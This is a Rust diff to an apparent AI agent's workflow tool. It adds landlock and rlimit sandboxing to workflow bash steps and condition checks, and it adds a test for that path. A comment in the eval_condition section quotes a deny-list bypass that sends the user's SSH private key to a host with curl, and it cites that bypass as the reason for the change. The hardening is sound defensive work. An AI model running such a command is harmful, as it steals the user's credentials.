@@ -14,21 +14,22 @@
 //! the tool returns `ToolOutcome::Error` rather than silently no-op'ing.
 
 use crate::session::bash_runner::{
-    cap_to_string, drain_capped, model_command_path, scrub_secrets_from_child_env, shell_program,
-    MAX_BASH_OUTPUT_BYTES,
+    cap_to_string, drain_capped, model_command_path, scrub_secrets_from_child_env, setup_rlimits,
+    shell_program, MAX_BASH_OUTPUT_BYTES,
 };
 #[cfg(windows)]
 use crate::session::process_group::assign_child_to_job;
 use crate::session::process_group::{kill_process_group, reap_child, setup_process_group};
 use crate::shared::access::{DenyList, PathGuard};
 use crate::shared::bash_safety::check_bash_command_str;
-use crate::shared::{ToolDef, ToolError, ToolOutcome};
+use crate::shared::{SandboxConfig, ToolDef, ToolError, ToolOutcome};
 use crate::tools::task::TaskSpawner;
 use crate::tools::toolset::{CompositeToolset, Toolset};
 use crate::tools::{Tool, ToolContext};
 use anyhow::{bail, Context, Result};
 use kf_workflow::{StepOutput, StepRequest, StepRunner, Workflow, WorkflowExecutor};
 use std::collections::HashMap;
+use std::path::PathBuf;
 use std::process::Stdio;
 use std::sync::Arc;
 use std::time::Duration;
@@ -41,6 +42,14 @@ pub struct WorkflowTool {
     deny_list: DenyList,
     path_guard: PathGuard,
     bash_sandbox_workdir: bool,
+    // WO 47.25: spawn hardening for workflow bash steps + condition evals —
+    // the same config the foreground bash tool passes to
+    // `run_shell_with_token`. Populated after construction (WO 27.1
+    // pattern) so `new`'s arity and its test call sites stay unchanged.
+    pub(crate) sandbox_config: SandboxConfig,
+    // Operator landlock allow-list extras (config
+    // `security.landlock_extra_paths`), granted full r/w in the sandbox.
+    pub(crate) landlock_extra_paths: Vec<PathBuf>,
 }
 
 #[allow(clippy::new_without_default)]
@@ -50,6 +59,8 @@ impl WorkflowTool {
             deny_list,
             path_guard,
             bash_sandbox_workdir,
+            sandbox_config: SandboxConfig::default(),
+            landlock_extra_paths: Vec::new(),
         }
     }
 }
@@ -127,6 +138,8 @@ impl Tool for WorkflowTool {
             deny_list: &self.deny_list,
             path_guard: &self.path_guard,
             bash_sandbox_workdir: self.bash_sandbox_workdir,
+            sandbox_config: self.sandbox_config.clone(),
+            landlock_extra_paths: self.landlock_extra_paths.clone(),
             run_id: ctx.run_id.clone(),
         })
         .await
@@ -152,6 +165,10 @@ struct WorkflowRunArgs<'a> {
     deny_list: &'a DenyList,
     path_guard: &'a PathGuard,
     bash_sandbox_workdir: bool,
+    // WO 47.25: sandbox for bash steps + condition evals (parity with the
+    // foreground bash tool). Owned — cloned once per tool call.
+    sandbox_config: SandboxConfig,
+    landlock_extra_paths: Vec<PathBuf>,
     // WO 45.1/46.14: canonical session run_id threaded from ToolContext.
     run_id: Option<String>,
 }
@@ -167,6 +184,8 @@ async fn run_workflow(args: WorkflowRunArgs<'_>) -> Result<String> {
         deny_list,
         path_guard,
         bash_sandbox_workdir,
+        sandbox_config,
+        landlock_extra_paths,
         run_id,
     } = args;
     let path = kf_workflow::find_workflow_file(template)
@@ -182,6 +201,8 @@ async fn run_workflow(args: WorkflowRunArgs<'_>) -> Result<String> {
         deny_list: deny_list.clone(),
         path_guard: path_guard.clone(),
         bash_sandbox_workdir,
+        sandbox_config,
+        landlock_extra_paths,
         cancel_token,
         dry_run,
     };
@@ -270,26 +291,60 @@ enum BashOutcome {
     Cancelled,
 }
 
+/// Apply the pre-spawn hardening shared by workflow bash steps and
+/// condition evals — the same construction `run_shell_with_token`
+/// (`bash_runner/mod.rs`) applies to the foreground bash tool: secret env
+/// scrub, PATH pin, process group, and the `setup_rlimits` pre_exec
+/// (rlimits + landlock FS confinement + optional CLONE_NEWNET). WO 47.25:
+/// one sandboxed-shell-spawn path for both spawn sites, not two with
+/// diverging guarantees. The landlock workspace is the process CWD
+/// (workflow spawns inherit it; the foreground tool uses its workdir the
+/// same way).
+fn prepare_workflow_shell_cmd(
+    cmd: &mut tokio::process::Command,
+    sandbox: &SandboxConfig,
+    landlock_extra_paths: &[PathBuf],
+) {
+    cmd.env("PATH", model_command_path());
+    scrub_secrets_from_child_env(cmd);
+    setup_process_group(cmd);
+    #[cfg(target_os = "linux")]
+    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
+    #[cfg(target_os = "linux")]
+    let lp = crate::session::bash_runner::resolve_paths(&cwd, landlock_extra_paths);
+    #[cfg(not(target_os = "linux"))]
+    let lp: Option<()> = {
+        let _ = landlock_extra_paths;
+        None
+    };
+    setup_rlimits(cmd, sandbox, lp);
+}
+
 /// Spawn `sh -c <command>` with `kill_on_drop`, bounded by both a wall
 /// timeout and the workflow cancel token. On timeout or cancel the child
 /// process tree is killed (Unix process group / Windows Job Object) and
 /// the `Child` is dropped, and `kill_on_drop` reaps the direct child.
 ///
-/// WO 44.44: this path now inherits the same hardening as the foreground
+/// WO 44.44: this path inherits the same hardening as the foreground
 /// `run_shell_with_token` (`bash_runner/mod.rs`): secret env scrub, PATH
 /// pin, capped output drain (`MAX_BASH_OUTPUT_BYTES`), and process-tree
 /// kill (Unix `killpg` / Windows Job Object). Previously it buffered the
 /// whole stream via `wait_with_output()` with no cap and no env scrub.
-async fn run_bounded_bash(command: &str, cancel_token: &CancellationToken) -> BashOutcome {
+/// WO 47.25: rlimits + landlock FS confinement added via
+/// `prepare_workflow_shell_cmd` — full parity with the foreground tool.
+async fn run_bounded_bash(
+    command: &str,
+    cancel_token: &CancellationToken,
+    sandbox: &SandboxConfig,
+    landlock_extra_paths: &[PathBuf],
+) -> BashOutcome {
     let mut cmd = tokio::process::Command::new(shell_program());
     cmd.arg("-c")
         .arg(command)
         .kill_on_drop(true)
         .stdout(Stdio::piped())
-        .stderr(Stdio::piped())
-        .env("PATH", model_command_path());
-    scrub_secrets_from_child_env(&mut cmd);
-    setup_process_group(&mut cmd);
+        .stderr(Stdio::piped());
+    prepare_workflow_shell_cmd(&mut cmd, sandbox, landlock_extra_paths);
 
     let mut child = match cmd.spawn() {
         Ok(c) => c,
@@ -374,6 +429,11 @@ pub struct TaskSpawnerStepRunner {
     pub deny_list: DenyList,
     pub path_guard: PathGuard,
     pub bash_sandbox_workdir: bool,
+    /// WO 47.25: sandbox applied to workflow bash steps AND condition
+    /// evals (same config the foreground bash tool uses).
+    pub sandbox_config: SandboxConfig,
+    /// Operator landlock allow-list extras, granted full r/w.
+    pub landlock_extra_paths: Vec<PathBuf>,
     pub cancel_token: CancellationToken,
     pub dry_run: bool,
 }
@@ -406,7 +466,13 @@ impl StepRunner for TaskSpawnerStepRunner {
         ) {
             bail!("step '{name}': bash command denied: {denied}");
         }
-        let output = run_bounded_bash(command, &self.cancel_token).await;
+        let output = run_bounded_bash(
+            command,
+            &self.cancel_token,
+            &self.sandbox_config,
+            &self.landlock_extra_paths,
+        )
+        .await;
         match output {
             BashOutcome::Output {
                 stdout,
@@ -474,6 +540,12 @@ impl StepRunner for TaskSpawnerStepRunner {
     // condition is treated as `false` (skip) + warn, matching timeout/ spawn-
     // failure semantics: a skipped step is recoverable, a wedged workflow is
     // not.
+    //
+    // WO 47.25: the spawn itself goes through `prepare_workflow_shell_cmd`
+    // (rlimits + landlock pre_exec) via the lib's prepare hook, so the
+    // condition `sh -c` gets the same kernel-level confinement as a bash
+    // step — deny-list pattern-matching alone was bypassable (e.g.
+    // `test -f ~/.ssh/id_rsa && curl -s host -d @~/.ssh/id_rsa`).
     async fn eval_condition(&self, condition: &str) -> bool {
         if let Some(denied) = check_bash_command_str(
             condition,
@@ -485,7 +557,12 @@ impl StepRunner for TaskSpawnerStepRunner {
             tracing::warn!("condition denied: {denied} — skipping step");
             return false;
         }
-        kf_workflow::eval_condition_bounded(condition).await
+        let sandbox = self.sandbox_config.clone();
+        let extra = self.landlock_extra_paths.clone();
+        let prep = move |cmd: &mut tokio::process::Command| {
+            prepare_workflow_shell_cmd(cmd, &sandbox, &extra);
+        };
+        kf_workflow::eval_condition_bounded(condition, Some(&prep)).await
     }
 
     async fn run_batch(&self, steps: Vec<StepRequest>) -> Result<Vec<(String, String)>> {
@@ -507,6 +584,8 @@ impl StepRunner for TaskSpawnerStepRunner {
             let deny_list = self.deny_list.clone();
             let path_guard = self.path_guard.clone();
             let bash_sandbox_workdir = self.bash_sandbox_workdir;
+            let sandbox_config = self.sandbox_config.clone();
+            let landlock_extra_paths = self.landlock_extra_paths.clone();
             let name = req.name.clone();
             let handle = tokio::spawn(async move {
                 match req.kind {
@@ -537,7 +616,14 @@ impl StepRunner for TaskSpawnerStepRunner {
                         ) {
                             bail!("step '{}': bash command denied: {denied}", req.name);
                         }
-                        match run_bounded_bash(&req.command, &cancel_token).await {
+                        match run_bounded_bash(
+                            &req.command,
+                            &cancel_token,
+                            &sandbox_config,
+                            &landlock_extra_paths,
+                        )
+                        .await
+                        {
                             BashOutcome::Output {
                                 stdout,
                                 stderr,
@@ -1033,6 +1119,8 @@ mod tests {
             deny_list: DenyList::default(),
             path_guard: PathGuard::default(),
             bash_sandbox_workdir: false,
+            sandbox_config: SandboxConfig::default(),
+            landlock_extra_paths: Vec::new(),
             cancel_token: cancel,
             dry_run: false,
         };
@@ -1071,6 +1159,8 @@ mod tests {
             deny_list: DenyList::default(),
             path_guard: PathGuard::default(),
             bash_sandbox_workdir: false,
+            sandbox_config: SandboxConfig::default(),
+            landlock_extra_paths: Vec::new(),
             cancel_token: CancellationToken::new(),
             dry_run: false,
         };
@@ -1088,5 +1178,29 @@ mod tests {
             err.to_string().contains("timed out"),
             "error must name the timeout, got: {err}"
         );
+    }
+
+    // WO 47.25: condition evals now spawn through the same
+    // landlock+rlimit pre_exec as workflow bash steps. A benign condition
+    /// must still evaluate true through that path — if the pre_exec sandbox
+    /// broke the spawn, eval_condition would return false (spawn failure)
+    /// and this test catches it.
+    #[tokio::test]
+    async fn eval_condition_benign_condition_true_through_sandbox() {
+        let spawner: Arc<dyn TaskSpawner> = Arc::new(EchoSpawner {
+            calls: Arc::new(StdMutex::new(Vec::new())),
+        });
+        let runner = TaskSpawnerStepRunner {
+            spawner,
+            toolset: None,
+            deny_list: DenyList::default(),
+            path_guard: PathGuard::default(),
+            bash_sandbox_workdir: false,
+            sandbox_config: SandboxConfig::default(),
+            landlock_extra_paths: Vec::new(),
+            cancel_token: CancellationToken::new(),
+            dry_run: false,
+        };
+        assert!(runner.eval_condition("true").await);
     }
 }
